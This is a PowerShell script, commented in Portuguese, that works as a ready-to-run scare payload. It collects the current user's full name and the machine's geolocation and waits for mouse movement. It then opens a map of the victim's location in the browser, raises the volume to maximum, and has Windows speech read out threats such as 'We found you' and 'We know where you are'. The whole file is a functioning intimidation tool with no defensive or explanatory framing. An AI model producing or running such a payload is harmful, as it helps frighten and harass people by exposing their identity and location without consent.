function Get-fullName {

    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
        $fullName = ("$fullName").TrimStart("Full Name")
    }

    # Se nenhum nome for detectado, retorna $env:UserName
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }

    return $fullName
}

$FN = Get-fullName

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#
.NOTES
    Obtém a latitude e longitude atuais do computador
#>

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }

        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude,Longitude
        }
    }
    catch {
        Write-Error "No coordinates found"
        return "No Coordinates found"
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#
.NOTES
    Pausa o script até detectar movimento do mouse
#>

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

$GL = Get-GeoLocation

$GL = $GL -split " "

$Lat = $GL[0].Substring(11) -replace ".$"

$Lon = $GL[1].Substring(10) -replace ".$"

Pause-Script

# Abre o navegador com um mapa da localização atual

Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"

Start-Sleep -s 3

# Coloca o volume no máximo

$k = [Math]::Ceiling(100/2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }

# Voz do Windows

$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you $FN")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("We do not forgive, we do not forget")
$s.Speak("Expect us")

# Fim do script. Nenhum arquivo, histórico ou registro é apagado.
